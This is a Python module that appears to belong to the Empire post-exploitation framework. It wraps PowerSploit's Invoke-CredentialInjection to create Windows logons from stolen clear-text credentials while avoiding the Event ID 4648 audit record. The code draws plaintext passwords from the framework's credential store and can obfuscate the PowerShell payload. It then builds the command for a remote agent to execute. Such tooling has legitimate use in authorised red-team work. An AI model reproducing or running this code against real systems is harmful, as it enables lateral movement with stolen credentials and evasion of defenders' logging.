from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-CredentialInjection',

            'Author': ['@JosephBialek'],

            'Description': ("Runs PowerSploit's Invoke-CredentialInjection to "
                            "create logons with clear-text credentials without "
                            "triggering a suspicious Event ID 4648 (Explicit "
                            "Credential Logon)."),

            'Background' : False,

            'OutputExtension' : None,

            'NeedsAdmin' : True,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-CredentialInjection.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'NewWinLogon' : {
                'Description'   :   'Switch. Create a new WinLogon.exe process.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ExistingWinLogon' : {
                'Description'   :   'Switch. Use an existing WinLogon.exe process',
                'Required'      :   False,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DomainName' : {
                'Description'   :   'The domain name of the user account.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   'Username to log in with.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password of the user.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'LogonType' : {
                'Description'   :   'Logon type of the injected logon (Interactive, RemoteInteractive, or NetworkCleartext)',
                'Required'      :   False,
                'Value'         :   'RemoteInteractive'
            },
            'AuthPackage' : {
                'Description'   :   'authentication package to use (Kerberos or Msv1_0)',
                'Required'      :   False,
                'Value'         :   'Kerberos'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-CredentialInjection.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = "Invoke-CredentialInjection"

        if self.options["NewWinLogon"]['Value'] == "" and self.options["ExistingWinLogon"]['Value'] == "":
            print helpers.color("[!] Either NewWinLogon or ExistingWinLogon must be specified")
            return ""

        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":

            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if credType != "plaintext":
                print helpers.color("[!] A CredID with a plaintext password must be used!")
                return ""

            if domainName != "":
                self.options["DomainName"]['Value'] = domainName
            if userName != "":
                self.options["UserName"]['Value'] = userName
            if password != "":
                self.options["Password"]['Value'] = password

        if self.options["DomainName"]['Value'] == "" or self.options["UserName"]['Value'] == "" or self.options["Password"]['Value'] == "":
            print helpers.color("[!] DomainName/UserName/Password or CredID required!")
            return ""

        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "credid":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
